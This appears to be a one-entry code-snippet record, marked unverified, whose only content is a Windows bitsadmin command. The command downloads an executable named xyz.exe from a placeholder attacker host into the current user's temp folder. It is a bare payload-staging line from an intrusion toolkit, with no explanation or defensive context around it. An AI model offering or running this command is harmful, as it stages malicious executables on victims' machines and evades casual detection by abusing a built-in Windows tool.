---
id: ca9b8d32-d57e-4059-b9f4-ec3703d49225
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:27.052485+00:00'
updated_at: '2023-04-10T20:37:10.298426+00:00'
---

# Code Snippet ca9b8d32

**Language**: Powershell

```powershell
bitsadmin /transfer mydownloadjob /download /priority normal http://<attackerIP>/xyz.exe C:\\Users\\%USERNAME%\\AppData\\local\\temp\\xyz.exe
```
